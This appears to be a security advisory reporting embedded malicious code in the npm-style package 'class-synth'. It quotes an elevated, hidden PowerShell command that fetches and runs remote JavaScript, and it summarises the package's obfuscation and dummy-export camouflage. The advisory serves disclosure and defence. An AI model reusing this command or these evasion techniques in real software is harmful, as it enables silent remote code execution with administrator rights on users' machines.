summary: class-synth ships an import-time elevated PowerShell dropper that executes attacker-controlled remote JavaScript
details: On every require/import of dist/index.js, an async IIFE walks process.cwd() for.css files containing an `@sri-hash: <ciphertext>` marker, AES-256-CBC-decrypts the marker with a hardcoded key (split across an 8-element array and joined at runtime) to recover a URL, then spawns a hidden, UAC-elevated PowerShell process via `Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command "irm <url> | node -"' -Verb RunAs` to fetch and execute arbitrary JavaScript as Administrator. Node built-ins (node:fs, node:path, node:child_process, node:crypto) are loaded through base64-decoded specifiers and `process` is acquired via `new Function('return typeof process!== "undefined"? process: null;')` to defeat static analysis. The recovered URL is mutable (an attacker controls it by planting an `@sri-hash` marker in any.css file in the working tree) and there is no signature or hash verification on the fetched payload. The package is padded with ~1000+ trivial dummy exports (isWithinBoundaryN, applyPresetN, createSequenceStepN, mapOperationN, checkConstraintN) to camouflage the ~50-line malicious __init IIFE at the bottom of the bundle; the README/package.json advertise only class merging, styling, and date formatting, none of which justifies fs, child_process, crypto, AES, or PowerShell elevation.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
